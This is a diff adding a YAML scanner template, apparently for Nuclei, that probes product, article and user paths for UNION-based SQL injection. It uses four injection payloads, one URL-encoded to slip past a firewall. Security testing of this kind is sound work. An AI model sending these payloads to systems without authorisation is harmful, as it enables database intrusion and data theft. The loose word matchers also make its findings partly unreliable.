@@ -1,0 +1,42 @@
+id: sqli-p2
+
+info:
+  name: SQL Injection - UNION Based
+  author: custom
+  severity: high
+  description: SQL injection using UNION SELECT statements
+  tags: sqli,waf-bypass,union,injection
+
+http:
+  - raw:
+      - |
+        GET /{{path}}?id={{payload}} HTTP/1.1
+        Host: {{Hostname}}
+        
+      - |
+        POST /{{path}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        
+        id={{payload}}
+
+    payloads:
+      payload:
+        - "' UNION SELECT 1,2,3,4,5,6,7,8,9,10-- -"
+        - "' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--"
+        - "-1 UNION SELECT 1, version(), 3 -- +"
+        - "%55NION(%53ELECT 1,2,3)-- -"
+      path:
+        - "product"
+        - "article"
+        - "user"
+
+    stop-at-first-match: true
+    matchers-condition: or
+    matchers:
+      - type: word
+        words:
+          - "mysql"
+          - "version()"
+          - "SELECT"
+        condition: or
